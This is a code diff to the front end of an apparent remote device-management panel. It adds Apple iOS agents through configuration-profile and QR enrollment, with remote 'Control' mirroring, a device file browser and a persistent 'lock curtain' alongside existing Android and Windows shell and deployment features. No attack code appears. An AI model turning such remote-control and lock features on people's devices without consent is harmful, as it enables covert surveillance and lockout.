@@ -331,7 +331,7 @@ function renderAgentTable() {
         const platformLower = (agent.platform || '').toLowerCase();
         const deviceTypeLower = (agent.device_type || '').toLowerCase();
 
-        // Check if agent_id was generated as an Android package in package history
+        // Check if agent_id was generated as an Android or iOS package in package history
         const matchingPkg = Array.isArray(allGeneratedPackages) ? allGeneratedPackages.find(p => p.agent_id === agent.agent_id) : null;
         const pkgIsAndroid = matchingPkg && (
             (matchingPkg.arch && matchingPkg.arch.toLowerCase().includes('android')) ||
@@ -339,10 +339,30 @@ function renderAgentTable() {
             Boolean(matchingPkg.apk_url) ||
             Boolean(matchingPkg.sh_filename)
         );
+        const pkgIsIos = matchingPkg && (
+            (matchingPkg.arch && (matchingPkg.arch.toLowerCase().includes('ios') || matchingPkg.arch.toLowerCase().includes('iphone') || matchingPkg.arch.toLowerCase().includes('ipad'))) ||
+            Boolean(matchingPkg.profile_filename) ||
+            Boolean(matchingPkg.enroll_url)
+        );
+
+        const isIosAgent = Boolean(
+            agent.is_ios === true ||
+            archLower.includes('ios') ||
+            archLower.includes('iphone') ||
+            archLower.includes('ipad') ||
+            osLower.includes('ios') ||
+            osLower.includes('iphone') ||
+            osLower.includes('ipad') ||
+            platformLower.includes('ios') ||
+            deviceTypeLower.includes('ios') ||
+            deviceTypeLower.includes('iphone') ||
+            deviceTypeLower.includes('ipad') ||
+            pkgIsIos
+        );
 
         // Strict Android vs Windows determination:
         // Android if flagged as is_android, or arch/os/platform includes android, or matches an Android package
-        const isAndroidAgent = Boolean(
+        const isAndroidAgent = !isIosAgent && Boolean(
             agent.is_android === true || 
             archLower.includes('android') || 
             osLower.includes('android') || 
@@ -354,24 +374,30 @@ function renderAgentTable() {
         );
 
         // Backstage is strictly reserved for Windows endpoints ONLY
-        const isWindowsAgent = !isAndroidAgent && (
+        const isWindowsAgent = !isAndroidAgent && !isIosAgent && (
             osLower.includes('win') ||
-            (!agent.os && !archLower.includes('android'))
+            (!agent.os && !archLower.includes('android') && !archLower.includes('ios'))
         );
 
-        const deviceName = escapeHtml(agent.device_name || agent.hostname || agent.model || agent.endpoint_tag || 'Android Device');
+        const deviceName = escapeHtml(agent.device_name || agent.hostname || agent.model || agent.endpoint_tag || (isIosAgent ? 'Apple iOS Device' : 'Android Device'));
         const isCurtainLocked = (agent.curtain_active !== undefined) ? Boolean(agent.curtain_active) : Boolean(agentCurtainStates[agent.agent_id]);
 
         tr.innerHTML = `
             <td>${statusBadge}</td>
             <td>
                 <div class="tag-name">
-                    ${isAndroidAgent ? `<span style="color: #34d399; font-weight: 600;">📱 ( Phone )</span>` : `<span>${tagDisplay}</span>`}
+                    ${isIosAgent ? `<span style="color: #60a5fa; font-weight: 600;">🍎 ( Apple iOS )</span>` : (isAndroidAgent ? `<span style="color: #34d399; font-weight: 600;">📱 ( Phone )</span>` : `<span>${tagDisplay}</span>`)}
                 </div>
                 <span class="agent-id-pill" title="Click to copy Agent ID" onclick="copyText('${agent.agent_id}', 'Agent ID copied!')">ID: ${escapeHtml(agent.agent_id)}</span>
             </td>
             <td>
-                ${isAndroidAgent ? `
+                ${isIosAgent ? `
+                <div class="hostname-title" style="font-weight: 600; color: #f3f4f6;">${deviceName}</div>
+                <div class="user-sub" style="color: #94a3b8;">
+                    <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+                    <span>${escapeHtml(agent.endpoint_tag || deviceName)}</span>
+                </div>
+                ` : (isAndroidAgent ? `
                 <div class="hostname-title" style="font-weight: 600; color: #f3f4f6;">${deviceName}</div>
                 <div class="user-sub" style="color: #94a3b8;">
                     <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
@@ -383,10 +409,19 @@ function renderAgentTable() {
                     <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                     <span>${userDisplay}</span>
                 </div>
-                `}
+                `)}
             </td>
             <td>
-                ${isAndroidAgent ? `
+                ${isIosAgent ? `
+                <div style="display: flex; flex-direction: column; gap: 4px;">
+                    <span class="os-pill" style="border-color: rgba(96, 165, 250, 0.4); color: #60a5fa; font-weight: 500;">
+                        🍎 Apple iOS
+                    </span>
+                    <span class="arch-chip" style="background: rgba(96, 165, 250, 0.15); border: 1px solid rgba(96, 165, 250, 0.4); color: #93c5fd;" title="Apple Web Clip / Safari WebRTC">
+                        PWA / WebRTC
+                    </span>
+                </div>
+                ` : (isAndroidAgent ? `
                 <div style="display: flex; flex-direction: column; gap: 4px;">
                     <span class="os-pill" style="border-color: rgba(16, 185, 129, 0.4); color: #34d399; font-weight: 500;">
                         <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
@@ -408,20 +443,20 @@ function renderAgentTable() {
                     ${escapeHtml(agent.os || 'Windows')}
                 </span>
                 <span class="arch-chip">${escapeHtml(agent.arch || 'x64')}</span>
-                `}
+                `)}
             </td>
             <td>
                 <span class="ip-link" title="Click to copy IP" onclick="copyText('${agent.local_ip || '127.0.0.1'}', 'IP Address copied!')">${escapeHtml(agent.local_ip || '127.0.0.1')}</span>
             </td>
             <td>
                 <div class="specs-info">
-                    <strong>${isAndroidAgent ? (agent.battery !== undefined ? '🔋 ' + agent.battery + '% Battery' : (agent.ram_gb ? agent.ram_gb + ' GB RAM' : 'Mobile Active')) : (agent.ram_gb ? agent.ram_gb + ' GB RAM' : 'RAM: Active')}</strong>
+                    <strong>${isIosAgent ? (agent.battery !== undefined ? '🔋 ' + agent.battery + '% Battery' : (agent.screen_res ? '📱 ' + agent.screen_res : 'Apple iOS Active')) : (isAndroidAgent ? (agent.battery !== undefined ? '🔋 ' + agent.battery + '% Battery' : (agent.ram_gb ? agent.ram_gb + ' GB RAM' : 'Mobile Active')) : (agent.ram_gb ? agent.ram_gb + ' GB RAM' : 'RAM: Active'))}</strong>
                 </div>
             </td>
             <td>
                 <div class="build-info-cell">
                     <span class="version-chip ${agent.has_update ? 'update-available' : 'latest'}">
-                        ${escapeHtml(agent.update_version || '2.8.0')}
+                        ${escapeHtml(agent.update_version || (isIosAgent ? 'iOS PWA' : '2.8.0'))}
                     </span>
                     ${agent.has_update ? `
                         <button class="badge-update-available" onclick="promptAgentUpdate('${agent.agent_id}', event)" title="Click to review and apply update">
@@ -437,7 +472,20 @@ function renderAgentTable() {
             </td>
             <td style="text-align: right;">
                 <div class="action-btn-group">
-                    ${isAndroidAgent ? `
+                    ${isIosAgent ? `
+                    <button class="btn-action-control btn-action-mirror" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'mirror')" title="Take Control: Apple iOS Live Mirror">
+                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+                        <span>Control</span>
+                    </button>
+                    <button class="btn-action-control btn-action-files" ${!isOnline ? 'disabled' : ''} onclick="openFileManagerModal('${agent.agent_id}', event)" title="Browse device uploaded photos and files">
+                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                        <span>Files</span>
+                    </button>
+                    <button class="btn-action-control btn-action-lock ${isCurtainLocked ? 'btn-active-curtain' : ''}" onclick="${isCurtainLocked ? `unlockAndroidDevice('${agent.agent_id}', event)` : `openLockDeviceModal('${agent.agent_id}', event)`}" title="${isCurtainLocked ? 'Unlock iOS Device' : (isOnline ? 'Lock iOS Device (Persistent Lock Curtain)' : 'Queue Device Lock (Will lock when device reconnects)')}">
+                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                        <span>${isCurtainLocked ? 'Unlock' : 'Lock Device'}</span>
+                    </button>
+                    ` : (isAndroidAgent ? `
                         <button class="btn-action-control btn-action-update ${agent.has_update ? 'btn-has-update' : ''}" onclick="pushAgentUpdate('${agent.agent_id}', event)" title="${isOnline ? (agent.has_update ? 'Update Available: Click to push new build to device' : 'Push latest updated build to this Android device') : 'Device offline: Click to queue automatic update upon reconnection'}">
                             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                             <span>${agent.has_update ? 'Update App' : 'Push Update'}</span>
@@ -452,7 +500,7 @@ function renderAgentTable() {
                             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3"/></svg>
                             <span>Sync</span>
                         </button>
-                    `)}
+                    `))}
                     <button class="btn-action-control btn-action-mirror" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'mirror')" title="${isAndroidAgent ? 'Take Control: Remote Control & Shell' : 'Take Control: Mirror real desktop with physical mouse & keyboard'}">
                         <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                         <span>Control</span>
@@ -656,7 +704,9 @@ function openLockDeviceModal(agentId, event) {
     document.getElementById("lockTargetAgentId").value = agentId;
     const metaEl = document.getElementById("lockTargetMeta");
     if (metaEl) {
-        metaEl.innerText = `Target Android Device: ${agentId}`;
+        const ag = Array.isArray(latestAgentsList) ? latestAgentsList.find(a => a.agent_id === agentId) : null;
+        const isIos = ag && (ag.is_ios || (ag.platform || '').toLowerCase() === 'ios' || (ag.os || '').toLowerCase().includes('ios'));
+        metaEl.innerText = `Target ${isIos ? 'Apple iOS' : 'Mobile'} Device: ${agentId}`;
     }
 
     modal.classList.add("active");
@@ -809,6 +859,8 @@ function onArchChanged(val) {
     if (!btn) return;
     if (val === "android") {
         btn.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg><span>Build & Download APK</span>`;
+    } else if (val === "ios") {
+        btn.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a10 10 0 0 0-1.8 19.83c.5.1.7-.22.7-.48v-1.7c-2.78.6-3.37-1.34-3.37-1.34-.45-1.15-1.1-1.46-1.1-1.46-.9-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.9 1.52 2.34 1.08 2.91.83.1-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.94 0-1.09.39-1.98 1.03-2.68-.1-.25-.45-1.27.1-2.64 0 0 .84-.27 2.75 1.02.8-.22 1.65-.33 2.5-.33.85 0 1.7.11 2.5.33 1.91-1.29 2.75-1.02 2.75-1.02.55 1.37.2 2.39.1 2.64.64.7 1.03 1.59 1.03 2.68 0 3.84-2.34 4.68-4.57 4.93.36.31.68.92.68 1.85v2.74c0 .27.18.58.69.48A10 10 0 0 0 12 2z"/></svg><span>🍎 Generate iOS Profile & QR</span>`;
     } else {
         btn.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="m5 12 5 5L20 7"/></svg><span>Build & Download Exe</span>`;
     }
@@ -949,14 +1001,52 @@ async function submitGenerateAgent() {
 
         const data = await res.json();
         if (data.success) {
+            const isIos = (data.arch === 'ios' || arch === 'ios');
             const isAndroid = (data.arch === 'android' || arch === 'android');
             const winGrid = document.getElementById("windowsDownloadGrid");
             const androidGrid = document.getElementById("androidDownloadGrid");
+            const iosGrid = document.getElementById("iosDownloadGrid");
             const androidHint = document.getElementById("androidEnterpriseHint");
             const oneLinerLabel = document.getElementById("oneLinerLabel");
 
-            if (isAndroid) {
+            if (isIos) {
                 if (winGrid) winGrid.style.display = "none";
+                if (androidGrid) androidGrid.style.display = "none";
+                if (iosGrid) iosGrid.style.display = "grid";
+                if (androidHint) androidHint.style.display = "none";
+                if (oneLinerLabel) oneLinerLabel.innerText = "🍎 iOS 1-Click Enrollment URL (Safari / Camera)";
+
+                document.getElementById("builtFilename").innerText = data.profile_filename || "trmm_agent.mobileconfig";
+
+                const qrImg = document.getElementById("iosQrCodeImg");
+                if (qrImg && data.qr_data_url) {
+                    qrImg.src = data.qr_data_url;
+                }
+
+                const profileLink = document.getElementById("downloadIosProfileLink");
+                if (profileLink && data.profile_download_url) {
+                    profileLink.href = data.profile_download_url;
+                    profileLink.setAttribute("download", data.profile_filename || "trmm_agent.mobileconfig");
+                }
+
+                const openLink = document.getElementById("openIosLink");
+                if (openLink && data.enroll_url) {
+                    openLink.href = data.enroll_url;
+                }
+
+                document.getElementById("oneLinerCode").value = data.enroll_url || "";
+                document.getElementById("buildResultCard").style.display = "block";
+
+                if (typeof loadAllGeneratedAgents === "function") {
+                    loadAllGeneratedAgents(false);
+                }
+
+                btn.innerHTML = `<span>✓ iOS Profile & QR Ready</span>`;
+                showToast("iOS Profile Ready", "Scan the QR code with iPhone Camera or install the .mobileconfig profile.", "success");
+                btn.disabled = false;
+            } else if (isAndroid) {
+                if (winGrid) winGrid.style.display = "none";
+                if (iosGrid) iosGrid.style.display = "none";
                 if (androidGrid) androidGrid.style.display = "grid";
                 if (androidHint) androidHint.style.display = "block";
                 if (oneLinerLabel) oneLinerLabel.innerText = "1-Click Android Termux / Shell Deployment Command";
@@ -1009,6 +1099,7 @@ async function submitGenerateAgent() {
             } else {
                 if (winGrid) winGrid.style.display = "grid";
                 if (androidGrid) androidGrid.style.display = "none";
+                if (iosGrid) iosGrid.style.display = "none";
                 if (androidHint) androidHint.style.display = "none";
                 if (oneLinerLabel) oneLinerLabel.innerText = "1-Click PowerShell Deployment Command";
 
@@ -1233,12 +1324,23 @@ function renderAllAgentsTable(packages) {
         const agentId = escapeHtml(pkg.agent_id || "");
         const serverUrl = escapeHtml(pkg.server_url || "");
 
-        const isAndroid = (pkg.arch && pkg.arch.toLowerCase().includes('android')) ||
-                          !!(pkg.apk_filename || pkg.apk_url || pkg.sh_filename || (pkg.zip_filename && pkg.zip_filename.includes('_android.zip')));
+        const isIos = (pkg.arch && (pkg.arch.toLowerCase().includes('ios') || pkg.arch.toLowerCase().includes('iphone') || pkg.arch.toLowerCase().includes('ipad'))) ||
+                      !!(pkg.profile_filename || pkg.profile_download_url || pkg.enroll_url);
+        const isAndroid = !isIos && ((pkg.arch && pkg.arch.toLowerCase().includes('android')) ||
+                          !!(pkg.apk_filename || pkg.apk_url || pkg.sh_filename || (pkg.zip_filename && pkg.zip_filename.includes('_android.zip'))));
 
         // Build Download Links
         const links = [];
-        if (isAndroid) {
+        if (isIos) {
+            const profileUrl = pkg.profile_download_url || (pkg.profile_filename ? `/api/agents/download/${encodeURIComponent(pkg.profile_filename)}` : null);
+            if (profileUrl) {
+                links.push(`<a href="${profileUrl}" download="${escapeHtml(pkg.profile_filename || 'agent.mobileconfig')}" class="btn btn-xs btn-primary" style="background: #2563eb; border-color: #3b82f6;" title="Download Apple Configuration Profile (.mobileconfig)">PROFILE</a>`);
+            }
+            if (pkg.enroll_url) {
+                links.push(`<a href="${pkg.enroll_url}" target="_blank" class="btn btn-xs btn-secondary" title="Open Safari WebClip Enrollment">WEBCLIP</a>`);
+                links.push(`<button type="button" class="btn btn-xs btn-outline" onclick="copyText('${pkg.enroll_url}', 'Enrollment URL copied!')" title="Copy Enrollment Link">URL</button>`);
+            }
+        } else if (isAndroid) {
             const apkUrl = pkg.apk_download_url || pkg.apk_url;
             if (apkUrl) {
                 links.push(`<a href="${apkUrl}" download="${escapeHtml(pkg.apk_filename || 'agent.apk')}" class="btn btn-xs btn-primary" style="background: #059669; border-color: #10b981;" title="Download Android App (.apk)">APK</a>`);
@@ -1277,9 +1379,11 @@ function renderAllAgentsTable(packages) {
             }
         }
 
-        const tagBadge = isAndroid
-            ? `<span class="status-tag-ready" style="font-size: 10px; padding: 1px 6px; background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3);">🤖 ${tag}</span>`
-            : `<span class="status-tag-ready" style="font-size: 10px; padding: 1px 6px;">${tag}</span>`;
+        const tagBadge = isIos
+            ? `<span class="status-tag-ready" style="font-size: 10px; padding: 1px 6px; background: rgba(96, 165, 250, 0.15); color: #60a5fa; border: 1px solid rgba(96, 165, 250, 0.3);">🍎 ${tag}</span>`
+            : (isAndroid
+                ? `<span class="status-tag-ready" style="font-size: 10px; padding: 1px 6px; background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3);">🤖 ${tag}</span>`
+                : `<span class="status-tag-ready" style="font-size: 10px; padding: 1px 6px;">${tag}</span>`);
 
         return `
             <tr>
@@ -1962,12 +2066,14 @@ function openFileManagerModal(targetAgentId, event) {
         modal.style.display = "flex";
         modal.classList.add("active");
     }
+    const ag = Array.isArray(latestAgentsList) ? latestAgentsList.find(a => a.agent_id === fmCurrentAgentId) : null;
+    const isIos = ag && (ag.is_ios || (ag.platform || '').toLowerCase() === 'ios' || (ag.os || '').toLowerCase().includes('ios'));
     const titleEl = document.getElementById("fmModalTitle");
     if (titleEl) {
-        titleEl.innerText = `Android File Manager — [${fmCurrentAgentId}]`;
+        titleEl.innerText = `${isIos ? '🍎 iOS Device Files' : 'Android File Manager'} — [${fmCurrentAgentId}]`;
     }
     if (fmHistory.length === 0) {
-        fmLoadDirectory("/storage/emulated/0", true);
+        fmLoadDirectory(isIos ? "/uploads" : "/storage/emulated/0", true);
     } else {
         fmRefresh();
     }
